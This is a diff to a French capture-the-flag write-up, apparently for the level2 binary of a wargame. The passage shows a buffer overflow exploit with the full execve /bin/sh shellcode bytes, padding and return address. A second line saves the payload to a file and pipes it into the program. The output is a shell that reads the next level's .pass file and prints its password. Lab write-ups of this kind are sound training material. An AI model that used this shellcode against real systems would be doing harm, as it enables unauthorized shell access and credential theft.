@@ -107,7 +107,7 @@ $1 = 80
 - Le offset est de 80, mais notre shellcode est de **21 bytes** et le retour de **4 bytes**. On va donc devoir inserer (80 - (21+4) = 59) **59 bytes** entre le shellcode et le retour pour rendre executer notre exploit du binaire `level2`
 
 ```
-(python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "q" * 59 + "\x08\xa0\x04\x08"'; cat) | ./level2
+:~$ (python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "q" * 59 + "\x08\xa0\x04\x08"'; cat) | ./level2
 
 :~$ python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "q" * 59 + "\x08\xa0\x04\x08"' > /tmp/level2
 :~$ cat /tmp/level2 - | ./level2
@@ -117,5 +117,4 @@ whoami
 level3
 cat /home/user/level3/.pass
 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
-
 ```
